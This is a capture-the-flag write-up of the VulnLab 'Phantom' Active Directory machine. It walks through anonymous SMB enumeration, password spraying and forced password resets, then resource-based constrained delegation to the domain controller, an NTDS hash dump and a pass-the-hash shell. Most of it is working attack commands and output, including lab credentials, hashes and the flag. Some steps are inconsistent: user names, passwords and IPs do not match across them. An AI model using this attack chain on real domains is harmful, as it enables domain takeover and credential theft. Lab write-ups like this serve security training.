---
title: "VulnLab: Phantom"
date: 2024-07-14 18:00 -0500
categories:
  - writeups
  - vulnlab
tags:
  - rbcd
  - AD
image: images/vulnlab_phantom/phantom.avif
description: Medium rated VulnLab machine by ar0x4
---
## TL;DR

Phantom is a **MEDIUM** difficulty machine on VulnLab. 

## Enumeration

### Nmap

The nmap scan shows a fair number of ports open. Based on the open ports, it looks like this is likely a domain controller. 

```console
10.10.92.34:53
10.10.92.34:88
10.10.92.34:135
10.10.92.34:139
10.10.92.34:389
10.10.92.34:445
10.10.92.34:464
10.10.92.34:593
10.10.92.34:636
10.10.92.34:3268
10.10.92.34:3269
10.10.92.34:3389
10.10.92.34:5357
10.10.92.34:5985
10.10.92.34:49664
10.10.92.34:49667
10.10.92.34:49669
10.10.92.34:49670
10.10.92.34:49671
10.10.92.34:49678
10.10.92.34:49711
10.10.92.34:49818
```

### Service Enumeration

#### SMB

Checking the SMB service, we find that this is indeed a domain controller running on Windows Server 2022. 

```console
➜ nxc smb $ip
SMB         10.10.92.34     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
```

We find that we have anonymous read access to a couple shares: `Public` and `IPC$`. The `IPC$` will be useful for getting a list of domain users. 

```console
➜ nxc smb $ip -u 'anonymous' -p '' --shares
SMB         10.10.92.34     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.92.34     445    DC               [+] phantom.vl\anonymous: (Guest)
SMB         10.10.92.34     445    DC               [*] Enumerated shares
SMB         10.10.92.34     445    DC               Share           Permissions     Remark
SMB         10.10.92.34     445    DC               -----           -----------     ------
SMB         10.10.92.34     445    DC               ADMIN$                          Remote Admin
SMB         10.10.92.34     445    DC               C$                              Default share
SMB         10.10.92.34     445    DC               Departments Share
SMB         10.10.92.34     445    DC               IPC$            READ            Remote IPC
SMB         10.10.92.34     445    DC               NETLOGON                        Logon server share
SMB         10.10.92.34     445    DC               Public          READ
SMB         10.10.92.34     445    DC               SYSVOL                          Logon server share

```

First, however, we can check the `Public` share to see if there's anything useful. Get `tech_support_email.eml`

```

17:53 ~/Labs/VL/phantom
➜ smbclient.py -dc-ip $ip anonymous:''@$ip
Impacket v0.12.0.dev1+20240710.195103.3c15e009 - Copyright 2023 Fortra

Password:
Type help for list of commands
# shares
ADMIN$
C$
Departments Share
IPC$
NETLOGON
Public
SYSVOL
# use Public
# ls
drw-rw-rw-          0  Thu Jul 11 10:03:14 2024 .
drw-rw-rw-          0  Sun Jul  7 03:39:30 2024 ..
-rw-rw-rw-      14565  Sat Jul  6 11:09:28 2024 tech_support_email.eml
# get tech_support_email.eml

```



```

17:53 ~/Labs/VL/phantom
➜ cat tech_support_email.eml
Content-Type: multipart/mixed; boundary="===============6932979162079994354=="
MIME-Version: 1.0
From: alucas@phantom.vl
To: techsupport@phantom.vl
Date: Sat, 06 Jul 2024 12:02:39 -0000
Subject: New Welcome Email Template for New Employees

--===============6932979162079994354==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit


Dear Tech Support Team,

I have finished the new welcome email template for onboarding new employees.

Please find attached the example template. Kindly start using this template for all new employees.

Best regards,
Anthony Lucas

[...SNIP...]
```


![[Pasted image 20240711175755.png]]

```
Ph4nt0m@5t4rt!
```

Getting a list of usernames with --rid-brute

```
18:00 ~/Labs/VL/phantom
➜ nxc smb $ip -u 'anonymous' -p '' --rid-brute
SMB         10.10.92.34     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.92.34     445    DC               [+] phantom.vl\anonymous: (Guest)
SMB         10.10.92.34     445    DC               498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.92.34     445    DC               500: PHANTOM\Administrator (SidTypeUser)
SMB         10.10.92.34     445    DC               501: PHANTOM\Guest (SidTypeUser)
SMB         10.10.92.34     445    DC               502: PHANTOM\krbtgt (SidTypeUser)
SMB         10.10.92.34     445    DC               512: PHANTOM\Domain Admins (SidTypeGroup)
SMB         10.10.92.34     445    DC               513: PHANTOM\Domain Users (SidTypeGroup)
SMB         10.10.92.34     445    DC               514: PHANTOM\Domain Guests (SidTypeGroup)
SMB         10.10.92.34     445    DC               515: PHANTOM\Domain Computers (SidTypeGroup)
SMB         10.10.92.34     445    DC               516: PHANTOM\Domain Controllers (SidTypeGroup)
SMB         10.10.92.34     445    DC               517: PHANTOM\Cert Publishers (SidTypeAlias)
SMB         10.10.92.34     445    DC               518: PHANTOM\Schema Admins (SidTypeGroup)
SMB         10.10.92.34     445    DC               519: PHANTOM\Enterprise Admins (SidTypeGroup)
SMB         10.10.92.34     445    DC               520: PHANTOM\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.92.34     445    DC               521: PHANTOM\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.92.34     445    DC               522: PHANTOM\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.92.34     445    DC               525: PHANTOM\Protected Users (SidTypeGroup)
SMB         10.10.92.34     445    DC               526: PHANTOM\Key Admins (SidTypeGroup)
SMB         10.10.92.34     445    DC               527: PHANTOM\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.92.34     445    DC               553: PHANTOM\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.92.34     445    DC               571: PHANTOM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.92.34     445    DC               572: PHANTOM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.92.34     445    DC               1000: PHANTOM\DC$ (SidTypeUser)
SMB         10.10.92.34     445    DC               1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         10.10.92.34     445    DC               1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.92.34     445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
SMB         10.10.92.34     445    DC               1104: PHANTOM\TechSupports (SidTypeGroup)
SMB         10.10.92.34     445    DC               1105: PHANTOM\Server Admins (SidTypeGroup)
SMB         10.10.92.34     445    DC               1106: PHANTOM\ICT Security (SidTypeGroup)
SMB         10.10.92.34     445    DC               1107: PHANTOM\DevOps (SidTypeGroup)
SMB         10.10.92.34     445    DC               1108: PHANTOM\Accountants (SidTypeGroup)
SMB         10.10.92.34     445    DC               1109: PHANTOM\FinManagers (SidTypeGroup)
SMB         10.10.92.34     445    DC               1110: PHANTOM\EmployeeRelations (SidTypeGroup)
SMB         10.10.92.34     445    DC               1111: PHANTOM\HRManagers (SidTypeGroup)
SMB         10.10.92.34     445    DC               1112: PHANTOM\rnichols (SidTypeUser)
SMB         10.10.92.34     445    DC               1113: PHANTOM\pharrison (SidTypeUser)
SMB         10.10.92.34     445    DC               1114: PHANTOM\wsilva (SidTypeUser)
SMB         10.10.92.34     445    DC               1115: PHANTOM\elynch (SidTypeUser)
SMB         10.10.92.34     445    DC               1116: PHANTOM\nhamilton (SidTypeUser)
SMB         10.10.92.34     445    DC               1117: PHANTOM\lstanley (SidTypeUser)
SMB         10.10.92.34     445    DC               1118: PHANTOM\bbarnes (SidTypeUser)
SMB         10.10.92.34     445    DC               1119: PHANTOM\cjones (SidTypeUser)
SMB         10.10.92.34     445    DC               1120: PHANTOM\agarcia (SidTypeUser)
SMB         10.10.92.34     445    DC               1121: PHANTOM\ppayne (SidTypeUser)
SMB         10.10.92.34     445    DC               1122: PHANTOM\ibryant (SidTypeUser)
SMB         10.10.92.34     445    DC               1123: PHANTOM\ssteward (SidTypeUser)
SMB         10.10.92.34     445    DC               1124: PHANTOM\wstewart (SidTypeUser)
SMB         10.10.92.34     445    DC               1125: PHANTOM\vhoward (SidTypeUser)
SMB         10.10.92.34     445    DC               1126: PHANTOM\crose (SidTypeUser)
SMB         10.10.92.34     445    DC               1127: PHANTOM\twright (SidTypeUser)
SMB         10.10.92.34     445    DC               1128: PHANTOM\fhanson (SidTypeUser)
SMB         10.10.92.34     445    DC               1129: PHANTOM\cferguson (SidTypeUser)
SMB         10.10.92.34     445    DC               1130: PHANTOM\alucas (SidTypeUser)
SMB         10.10.92.34     445    DC               1131: PHANTOM\ebryant (SidTypeUser)
SMB         10.10.92.34     445    DC               1132: PHANTOM\vlynch (SidTypeUser)
SMB         10.10.92.34     445    DC               1133: PHANTOM\ghall (SidTypeUser)
SMB         10.10.92.34     445    DC               1134: PHANTOM\ssimpson (SidTypeUser)
SMB         10.10.92.34     445    DC               1135: PHANTOM\ccooper (SidTypeUser)
SMB         10.10.92.34     445    DC               1136: PHANTOM\vcunningham (SidTypeUser)
SMB         10.10.92.34     445    DC               1137: PHANTOM\SSPR Service (SidTypeGroup)

```



```
lstanley
```
```
gB6XTcqVP5MlP7Rc
```



```

18:49 ~/Labs/VL/phantom
➜ nxc smb $ip -u usernames.txt -p gB6XTcqVP5MlP7Rc
SMB         10.10.66.24     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.66.24     445    DC               [-] phantom.vl\Administrator:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.10.66.24     445    DC               [-] phantom.vl\Guest:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.10.66.24     445    DC               [-] phantom.vl\DC$:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.10.66.24     445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc

```


```
net rpc password "wsilva" "P@ssword2024" -U "phantom.vl"/"svc_sspr"%"gB6XTcqVP5MlP7Rc" -S "DC.phantom.vl"
```

```
P@ssword2024
```

```

19:01 ~/Labs/VL/phantom
➜ nxc smb $ip -u 'rnichols' -p 'P@ssword2024'
SMB         10.10.66.24     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.66.24     445    DC               [+] phantom.vl\rnichols:newP@ssword2024

```

Change password worked

![[Pasted image 20240712190346.png]]

So now we can do RBCD to get DA

```
addcomputer.py -computer-name 'ATTACKER$' -computer-pass Attacker123 -dc-ip 10.10.66.24 phantom.vl/rnichols
```

```
rbcd.py -dc-ip 10.10.66.24 -delegate-to DC$ -delegate-from ATTACKER$ phantom.vl/'rnichols:newP@ssword2024' -action write
```

```
getST.py -spn cifs/DC.phantom.vl -impersonate Administrator -dc-ip 10.10.66.25 phantom.vl/ATTACKER:Attacker123
```


Well, that's not ideal

```
19:11 ~/Labs/VL/phantom
➜ addcomputer.py -computer-name 'ATTACKER$' -computer-pass Attacker123 -dc-ip 10.10.66.24 phantom.vl/rnichols
Impacket v0.12.0.dev1+20240710.195103.3c15e009 - Copyright 2023 Fortra

Password:
[-] Relayed user machine quota exceeded!

```



https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users

```
rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip $ip -action 'write' 'phantom.vl'/'wsilva':'P@ssw0rd2024'
```

```

14-Jul 15:10 phantom $ rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip $ip -action 'write' 'phantom.vl'/'wsilva':'P@ssword2024'
Impacket v0.12.0.dev1+20240710.195103.3c15e009 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] wsilva can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)

```

```
getTGT.py -hashes :$(pypykatz crypto nt 'P@ssword2024') 'phantom.vl'/'wsilva'
```

```
14-Jul 15:10 phantom $ getTGT.py -hashes :$(pypykatz crypto nt 'P@ssword2024') 'phantom.vl'/'wsilva'
Impacket v0.12.0.dev1+20240710.195103.3c15e009 - Copyright 2023 Fortra

[*] Saving ticket in wsilva.ccache

```


```
14-Jul 15:11 phantom $ describeTicket.py 'wsilva.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : 4709eea77f45c9e7f37e0e6dcf9bd016

```

```

14-Jul 15:14 phantom $ smbpasswd.py -newhashes :4709eea77f45c9e7f37e0e6dcf9bd016 'phantom.vl'/'wsilva':'P@ssword2024'@'DC.phantom.vl'
Impacket v0.12.0.dev1+20240710.195103.3c15e009 - Copyright 2023 Fortra

===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version
===============================================================================

[*] NTLM hashes were changed successfully.

```

```

14-Jul 15:14 phantom $ export KRB5CCNAME=wsilva.ccache

```


```

14-Jul 15:15 phantom $ getST.py -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" -k -no-pass 'phantom.vl'/'wsilva'
Impacket v0.12.0.dev1+20240710.195103.3c15e009 - Copyright 2023 Fortra

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache

```

```

14-Jul 15:16 phantom $ export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache

```

```

14-Jul 15:19 phantom $ nxc smb DC.phantom.vl --use-kcache --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n]
SMB         10.10.76.197    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.76.197    445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)
SMB         10.10.76.197    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.76.197    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:71fde26ba67afaedbed8b3549012d930:::
SMB         10.10.76.197    445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.76.197    445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:de0c6c1bf90cdc90ed73c2b765793df6:::
SMB         10.10.76.197    445    DC               phantom.vl\svc_sspr:1103:aad3b435b51404eeaad3b435b51404ee:8ecffccc2f22c1607b8e104296ffbf68:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\rnichols:1112:aad3b435b51404eeaad3b435b51404ee:6e2c9daa1d71941ea201a79fe134008a:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\pharrison:1113:aad3b435b51404eeaad3b435b51404ee:744cc56188561af3c16a8d0cd1e758d1:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\wsilva:1114:aad3b435b51404eeaad3b435b51404ee:4709eea77f45c9e7f37e0e6dcf9bd016:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\elynch:1115:aad3b435b51404eeaad3b435b51404ee:753389c36525eaa2182d2366e21cb37e:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\nhamilton:1116:aad3b435b51404eeaad3b435b51404ee:2d3aa57851c7686d3d3df4c2bf3ebbb8:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\lstanley:1117:aad3b435b51404eeaad3b435b51404ee:3945cd9505e0eca3621a4b61506a131a:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\bbarnes:1118:aad3b435b51404eeaad3b435b51404ee:8b86efbee20746efcf97d50081a7ada9:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\cjones:1119:aad3b435b51404eeaad3b435b51404ee:0253df7e458eedfc1b511ae1eadad057:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\agarcia:1120:aad3b435b51404eeaad3b435b51404ee:54199065e48fae91d67176d5d2c3d506:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ppayne:1121:aad3b435b51404eeaad3b435b51404ee:e628d1e4d23696da908acc1add7efbe4:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ibryant:1122:aad3b435b51404eeaad3b435b51404ee:ca996d2266c0e306701b78a06e3c29ab:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ssteward:1123:aad3b435b51404eeaad3b435b51404ee:5839c34d11b418846131f6944be80ca6:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\wstewart:1124:aad3b435b51404eeaad3b435b51404ee:1d2256228378d2093d25f5122981bcde:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\vhoward:1125:aad3b435b51404eeaad3b435b51404ee:fc97143b237f56c06e0d4f4bff1c7a09:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\crose:1126:aad3b435b51404eeaad3b435b51404ee:e9ad6ec6bd0ab88c16169b16114b216f:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\twright:1127:aad3b435b51404eeaad3b435b51404ee:f082f34b171dd47297674c2be83991b7:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\fhanson:1128:aad3b435b51404eeaad3b435b51404ee:3ecba7b39ce4b3fbe05362d6e05d31d0:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\cferguson:1129:aad3b435b51404eeaad3b435b51404ee:74bb37fa58020392821cdb89b5098f2d:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\alucas:1130:aad3b435b51404eeaad3b435b51404ee:53bd6a54d3dd605385e55f3226b0814d:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ebryant:1131:aad3b435b51404eeaad3b435b51404ee:abf123fca11a39c94bd92505f61c12a5:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\vlynch:1132:aad3b435b51404eeaad3b435b51404ee:c6837ff88c25daea76b0f390f7ab0552:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ghall:1133:aad3b435b51404eeaad3b435b51404ee:a1ca032e6023ddeedd9009d4c0a8c836:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ssimpson:1134:aad3b435b51404eeaad3b435b51404ee:1c029611755dfa697b1996f88a8d9c17:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\ccooper:1135:aad3b435b51404eeaad3b435b51404ee:fc35a773ba47633c4c1a807f91e9d496:::
SMB         10.10.76.197    445    DC               PHANTOM.vl\vcunningham:1136:aad3b435b51404eeaad3b435b51404ee:c187274e5ff6a96c44bce6200d6e7944:::
SMB         10.10.76.197    445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:5b8e451ecd6572656b4a93a333af6916:::
SMB         10.10.76.197    445    DC               [+] Dumped 30 NTDS hashes to /home/thomas/.nxc/logs/DC_10.10.76.197_2024-07-14_152139.ntds of which 29 were added to the database
SMB         10.10.76.197    445    DC               [*] To extract only enabled accounts from the output file, run the following command:
SMB         10.10.76.197    445    DC               [*] cat /home/thomas/.nxc/logs/DC_10.10.76.197_2024-07-14_152139.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.10.76.197    445    DC               [*] grep -iv disabled /home/thomas/.nxc/logs/DC_10.10.76.197_2024-07-14_152139.ntds | cut -d ':' -f1

```

```

14-Jul 15:21 phantom $ evil-winrm -i $ip -u 'administrator' -H '71fde26ba67afaedbed8b3549012d930'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/4/2024   7:22 AM           2308 Microsoft Edge.lnk
-a----          7/6/2024  11:57 AM             36 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt

```


```
VL{de224fef26acd82867e04addc0776b2a}
```


